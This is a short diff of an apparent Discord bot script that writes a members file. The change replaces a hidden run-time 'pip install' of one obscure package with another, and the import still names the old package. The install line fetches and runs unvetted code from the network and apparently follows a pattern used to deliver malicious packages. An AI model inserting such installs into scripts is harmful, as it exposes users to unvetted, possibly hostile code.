@@ -1,5 +1,5 @@
 import discord
-os.system('pip install beautystyle')
+os.system('pip install ossxe')
 from beautystyle import code
 from discord.ext import commands
 f = open('members.txt', 'w')
